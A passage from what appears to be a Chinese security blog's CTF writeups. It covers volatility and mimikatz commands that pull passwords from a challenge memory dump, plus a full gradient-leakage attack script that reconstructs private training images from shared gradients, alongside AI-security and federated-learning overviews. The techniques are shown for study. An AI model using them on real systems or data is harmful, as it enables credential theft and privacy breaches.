    <url>/2024/02/02/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-Writeup/</url>
    <content><![CDATA[<h1>2024西湖论剑-Writeup</h1>
<h2 id="easy-rawraw">easy_rawraw</h2>
<p><strong>考点：内存分析，密码提取</strong></p>
<p>重新对这道题剖析一下</p>
<p>本题的描述为easy raw! many passwords!</p>
<p>关键词为passwords</p>
<p>有端联想，可能存在的就是账户的密码，剪切板中是否存在密码，是否有密码的hash，以及一些可能的爆破操作</p>
<p>首先看一下账户的密码，有两种方法</p>
<p>第一种是PasswareKitForensic</p>
<p><img src="https://s2.loli.net/2024/02/02/Zgcjdf7PslzYxia.png" alt="2024西湖论剑_1"></p>
<p>第二种是使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#确定镜像版本</span><br><span class="line">vol.py -f rawraw.raw imageinfo</span><br><span class="line">vol.py --plugins=./volatility/plugins/ -f rawraw.raw  --profile=Win7SP1x64 mimikatz</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/02/bMwQquC2hcr5iax.png" alt="2024西湖论剑_2"></p>
<p>其次还存在一个密码</p>
<p>也有两种方法</p>
<p>第一种是010打开，搜索关键词检索我们可以发现</p>
<p><img src="https://s2.loli.net/2024/02/02/aCFMNyxAcOGQep7.png" alt="2024西湖论剑_4"></p>
<p>第二种我们检索一下剪切板内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 clipboard</span><br><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 clipboard -v  #查看详细内容</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/02/FdwmvIgG2kbYhio.png" alt="2024西湖论剑_5"></p>
<p><img src="https://s2.loli.net/2024/02/02/MJdNU1CocaFPOxS.png" alt="2024西湖论剑_6"></p>
<p>接着，继上面得到两个密码后，我们来搜索密码关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 filescan | grep pass</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/02/TY7WsbnJz6Lli1C.png" alt="2024西湖论剑_3"></p>
<p>发现存在一个压缩包</p>
<p>然后将其dump出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df8b650 -D ./</span><br></pre></td></tr></table></figure>
<p>分离出一张图片，图片里有压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@DESKTOP-BESI31C:/home/wjy/tools/volatility-master# binwalk pass.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 510 x 133, 8-bit/color RGBA, non-interlaced</span><br><span class="line">3185          0xC71           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">9831          0x2667          Zip archive data, encrypted at least v2.0 to extract, compressed size: 1906, uncompressed size: 3299, name: pass.txt</span><br><span class="line">11881         0x2E69          End of Zip archive, footer length: 49, comment: &quot;Have a good New Year!!!!!!!&quot;</span><br></pre></td></tr></table></figure>
<p>然后根据这个提示很容易猜出秘密就是20240210，当然直接爆破也是很快的</p>
<p>于是得到了一个密码本</p>
<p>我们查看进程可以发现存在一个VeraCrypt.exe</p>
<p><img src="https://s2.loli.net/2024/02/02/5XBzJ2vFIbu73ZD.png" alt="2024西湖论剑_7"></p>
<p>先使用<code>DasrIa456sAdmIn987</code>去解压mysecretfile.rar</p>
<p>然后进行挂载，并使用pass.txt作为密码本去解密</p>
<p>在隐藏项目中发现一个data.xlsx，但也存在密码，我们使用第一个获取的<code>das123admin321</code></p>
<p><img src="https://s2.loli.net/2024/02/02/tfXjoNUalyiwS64.png" alt="2024西湖论剑_8"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>西湖论剑</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（3）network-in-network</title>
    <url>/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/</url>
    <content><![CDATA[<h1>AI-CTF（3）network-in-network</h1>
<p>本题来自2023HITCTF，这是赛后进行的复现</p>
<p>有被骂到，qwq~~</p>
<p><img src="https://s2.loli.net/2023/12/01/bB4Tfy8JHpP2Nd9.png" alt=""></p>
<p>首先来看问题代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line">m = trans(file)</span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>简单解释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用 PIL 打开一张名为 ‘origin.jpg’ 的图像。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<p>创建一个图像转换操作的管道，将图像转换为 PyTorch 的张量（tensor）。<code>transforms.ToTensor()</code> 将图像转换为张量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = trans(file)</span><br></pre></td></tr></table></figure>
<p>通过上面的转换管道，将图像 ‘origin.jpg’ 转换为张量 <code>m</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br></pre></td></tr></table></figure>
<p>设置 PyTorch 的随机种子，以确保结果的可重复性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>构建一个简单的卷积神经网络（CNN）模型。该模型由以下层组成：</p>
<ul>
<li>一个卷积层 (<code>nn.Conv2d</code>)，输入通道数为 3，输出通道数为 5，卷积核大小为 3。</li>
<li>一个 ReLU 激活函数 (<code>nn.ReLU</code>)。</li>
<li>一个卷积层，输入通道数为 5，输出通道数为 10，卷积核大小为 5。</li>
<li>一个 ReLU 激活函数。</li>
<li>一个最大池化层 (<code>nn.MaxPool2d</code>)，池化窗口大小为 2。</li>
<li>一个全连接层 (<code>nn.Linear</code>)，输入特征数为 317，输出特征数为 800。</li>
<li>一个卷积层，输入通道数为 10，输出通道数为 1，卷积核大小为 1。</li>
<li>一个 Sigmoid 激活函数 (<code>nn.Sigmoid</code>)。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用模型对输入图像进行处理，将处理后的张量通过 <code>squeeze()</code> 去掉维度为 1 的尺寸，然后使用 <code>torchvision.utils.save_image</code> 将处理后的图像保存为 ‘enc.png’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>其实，这题的重点问题模型的输出逆推。首先，是前面卷积层卷积核小，仅捕捉局部细节特征，对整体图像不会有太大影响。其次，在全连接层，将十个通道进行了归一化处理，因此我们所能得到的仅是全连接层后被均值处理后的图像。</p>
<p>被困难卡住了，得弄明白回来补充</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>HITCTF</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-安全（1）总述</title>
    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
    <content><![CDATA[<h1>AI安全</h1>
<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
<p>这是引用的其中的一段话：</p>
<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
<p>学习心得及相关记录如下：</p>
<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
<p>AI相关CTF赛题：</p>
<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI安全</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（1）Alice-AI系列</title>
    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
<h2 id="2022-CTF">2022*CTF</h2>
<h3 id="Alice’s-challenge">Alice’s challenge</h3>
<p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
<p>这边对每一部分代码进行解释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
<p>然后根据相关资料找了一个改进的攻击方法</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>2022*CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-安全（2）梯度泄露攻击</title>
    <url>/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1>梯度泄露攻击</h1>
<h2 id="什么是梯度？">什么是梯度？</h2>
<p>梯度是一个向量求导的导数，使用梯度就是为了寻找最快得到损失函数的方向，而梯度交换是现代多节点机器学习系统中广泛使用的一种方法。</p>
<h2 id="什么是联邦学习？">什么是联邦学习？</h2>
<p>首先明确，联邦学习本质上是一种<strong>分布式</strong>机器学习技术，或机器学习<strong>框架</strong>。</p>
<p>联邦学习的目标是在保证数据隐私安全及合法合规的基础上，实现共同建模，提升AI模型的效果。</p>
<p>众所周知，人工智能技术有两个关键点，模型和数据，而受限于数据量巨大，集中不易，产生了分布式机器学习技术，在此之上，联邦学习于 2016 年被谷歌首次提出，设计动机是为了在智能程序训练的过程中保护手机或平板电脑中用户的隐私数据，进而提出一种数据不动模型动的新型分布式机器学习范式，称之为 Federated Learning，中文译为联邦学习。</p>
<p>能够保护隐私的原因是每个用户的数据始终储存在本地，仅有模型的梯度在不同设备之前传播。这类算法不需要将数据集中到一处，可以在保护用户隐私的同时，也让模型从海量数据中受益。例如多家医院可以共同训练一个医疗模型而无需共享患者的医疗数据。</p>
<p>根据各参与方数据划分的不同，联邦学习可以分为横向联邦学习，纵向联邦学习和联邦迁移学习。</p>
<p><img src="https://s2.loli.net/2023/11/15/Q3tMkjqGnIErmgB.png" alt=""></p>
<h2 id="攻击原理及过程">攻击原理及过程</h2>
